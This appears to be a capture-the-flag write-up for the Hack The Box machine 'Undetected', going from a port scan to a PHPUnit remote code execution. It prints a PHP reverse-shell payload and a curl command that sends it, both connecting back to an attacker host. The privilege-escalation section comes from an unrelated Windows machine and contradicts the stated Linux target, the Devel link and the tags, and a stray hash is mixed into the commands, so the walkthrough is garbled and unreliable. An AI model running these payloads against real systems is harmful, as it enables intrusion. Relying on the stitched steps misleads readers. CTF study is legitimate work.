---
layout: post
title: Hack The Box - Undetected
categories:
  - hackthebox
slug: htb-undetected
tags:
  - windows
---
## Challenge description

[https://app.hackthebox.com/machines/Devel](https://app.hackthebox.com/machines/Undetected)

This VM is a medium Linux machine

## Reconnaissance / Enumeration

### Port scanning and service identification

```
$ rustscan -a $ip -r 1-65535 --ulimit 5000 -- -A -sC
[...]
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2 (protocol 2.0)
| ssh-hostkey: 
|   3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDeVJjvJKCD1dlTm7jo6sY5A6q2oWFakWfH/y6lkWB5eIeVxzQTT/XXyA2RW/Zegb7vbpculYjr6cPtbouTLqPkyi2Xzyk3Jz2jQHKi6qTcHIQL75tITJKPCag4tAAIvKpSCwT13B38TKd0KV2R8T59raCu83095p/GaLrdhwGUbuD0p+/GnN1jIsLs04V26rbPKLmMJLj7Dj/+yCo/CF88/4EQaFFC920sjln4FZ7FlVhv4mIwIb10nIsEgvsKBIGvvu4ZKKKU+Al6p8bYI50srY/plKu0RxZpKE6QGV17IC38q8CDsLWkmFr5emeIxHfvgUlYaAOruACcnru6azsJw69s2Kq/dKaz8K6PjRb9Ybf6/Ix8xGhfJ/gH6x0PhlxIKXD1M93XILJmgKRPJpzqrA6NZ+mtQwx0JFsgHHJno/TSrx00E6GPEtUPHcxOVZE0m0Y9rfd5Q8W6/eJN/Q3nMIywfHKZE1RUQOziGtud/jAOOApvrRHRO6l0riwQCK8=
|   256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBQjfhdRHFh+eC/2RtmQwDSGmf0psHnd2uqXFyN0zdiyxvF3WCQYaxOgerNZqC0RyQjm2hW0DN6/0oim3slS8dw=
|   256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFdnC6v7My/dt23PaoX7MGbuZ8/8KZh1O+xt4dDFvFQK
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Diana's Jewelry
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)

```

### Web Enumeration

Exposed vendor folder

search each modules for exploit

php unit, rce

rcepoc.png

## Exploitation && Foothold

<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.16 4444 >/tmp/f'); ?>

curl -X POST http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -d "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.16 4444 >/tmp/f'); ?>"

Foothold as www-data

## Lateral Movement

Must move to steven

## Privilege Escalation

There are 2 services vulnerable to a registry edit attack. Dnscache and RpcEptMapper. There is a way to create a performance counter pointing to a malicious DLL.

The exploit is well described [here](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

There's a metasploit module that we can use to exploit the service: exploit/windows/local/service_permissions

```
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use exploit/windows/local/service_permissions
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/service_permissions) > set session 1
session => 1
msf6 exploit(windows/local/service_permissions) > set lhost tun0
lhost => tun0
msf6 exploit(windows/local/service_permissions) > run

[*] Started reverse TCP handler on 1.1.1.1:4444
[*] Trying to add a new service...
[*] Trying to find weak permissions in existing services..
[+] [Dnscache] Created registry key: HKLM\System\CurrentControlSet\Services\Dnscache\Performance
[*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 4 opened (1.1.1.1:4444 -> 10.10.10.5:49271 ) at 2022-01-19 02:02:05 +0000

meterpreter > shell
Process 728 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
e69af0e4f443de7e36876fda4ec7644f
C:\Windows\system32>whoami
whoami
nt authority\system

c:\Users\babis\Desktop>more user.txt.txt
more user.txt.txt
(redacted)

C:\Windows\system32>more e69af0e4f443de7e36876fda4ec7644fc:\users\administrator\desktop\root.txt
more c:\users\administrator\desktop\root.txt
(redacted)
```

Thanks for reading <3

h3x
